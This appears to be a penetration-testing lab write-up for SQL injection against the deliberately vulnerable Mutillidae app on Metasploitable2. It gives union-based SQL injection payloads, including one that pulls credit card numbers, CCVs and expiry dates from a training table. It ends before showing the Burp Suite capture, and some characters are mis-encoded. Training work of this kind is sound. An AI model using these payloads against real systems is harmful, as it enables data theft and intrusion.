# Documentation of Working with Metasploitable2: Penetration Testing Lab

This project demonstrates basic **penetration testing techniques** using **Metasploitable2** and **Kali Linux**. The focus is on identifying and exploiting **SQL Injection vulnerabilities** through the **Mutillidae** web application. Traffic interception and analysis are also performed using **Burp Suite**.

## üß∞ Tools Used

| Tool | Description |
|------|-------------|
| **Kali Linux** | A Debian-based OS packed with tools for digital forensics and penetration testing. It includes numerous security tools and is ideal for penetration testers. |
| **Metasploitable2** | A vulnerable virtual machine used for practicing penetration testing. |
| **Mutillidae** | A web application purposely designed with vulnerabilities for training and testing. It includes common vulnerabilities like **SQL Injection**, **XSS**, and more. |
| **Burp Suite** | A powerful platform for web application security testing, capable of intercepting and modifying HTTP requests. |

## üñ•Ô∏è Environment Setup

### Step 1: Identifying the Metasploitable2 IP Address

Identified the IP address of Metasploitable2 using the following command:

```bash
ifconfig -a
```

### Step 2: Access Mutillidae Web Application

Browser Address: ```http://<Metasploitable2-IP>/mutillidae```

## üíâ SQL Injection Testing

### 1. Testing Union-based SQLi vulnerability

Using UNION SELECT to determine number of columns:

#### Command:

```bash
UNION SELECT NULL,NULL,NULL,NULL,NULL ‚Äì
```

### 2. Retrieving sensitive data
Columns **CCV, ccnumber, expiration** from the **credit_cards** table in **owasp10 database** (Mutillidae).

#### Command:

```bash
UNION SELECT NULL, ccv, ccnumber, expiration, NULL FROM credit_cards ‚Äì
```

### 3. Using Union-based SQLi to display the version of the MySQL database that Mutillidae web application server is running:

#### Command:

```bash
UNION SELECT NULL, VERSION(), NULL, NULL, NULL ---
```

## üõ∞Ô∏è Intercepting and Capturing HTTP traffic using Burp Suite

### Browser Address: 

#### ```http://<Metasploitable2-IP>/mutillidae/index.php?page=view-someones-blog.php```

Configured Burp Suite Proxy to listen on 127.0.0.1:8080 and set the Browser to use Burp as proxy.

#### Captured HTTP request:
